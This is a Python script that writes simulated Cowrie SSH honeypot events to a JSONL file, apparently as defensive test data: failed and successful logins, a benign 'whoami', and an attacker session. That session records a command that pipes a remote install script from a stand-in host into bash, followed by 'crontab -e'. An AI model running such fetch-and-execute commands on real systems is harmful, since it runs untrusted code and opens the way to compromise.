import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUTPUT = Path("data/processed/simulated_campaign.jsonl")

BASE = datetime(2026, 11, 10, 1, 0, tzinfo=timezone.utc)

events = []


def add_event(minute, ip, session, event_type, **fields):
    timestamp = BASE + timedelta(minutes=minute)

    events.append({
        "timestamp": timestamp.isoformat().replace("+00:00", "Z"),
        "session_id": session,
        "event_type": event_type,
        "source_ip": ip,
        "protocol": "ssh",
        **fields
    })


# Attacker A: brute force followed by successful login
for minute in range(5):
    add_event(
        minute, "203.0.113.10", "sim-bruteforce",
        "cowrie.login.failed"
    )

add_event(
    6, "203.0.113.10", "sim-bruteforce",
    "cowrie.login.success"
)

# Attacker B: suspicious command execution
add_event(
    10, "198.51.100.24", "sim-command",
    "cowrie.command.input",
    command="curl https://example.invalid/install.sh | bash"
)

add_event(
    11, "198.51.100.24", "sim-command",
    "cowrie.command.input",
    command="crontab -e"
)

# Normal user: benign activity
add_event(
    12, "192.0.2.45", "sim-normal",
    "cowrie.command.input",
    command="whoami"
)

OUTPUT.parent.mkdir(parents=True, exist_ok=True)

with OUTPUT.open("w", encoding="utf-8") as file:
    for event in events:
        file.write(json.dumps(event) + "\n")

print(f"Generated {len(events)} synthetic events")
print(f"Saved to {OUTPUT}")
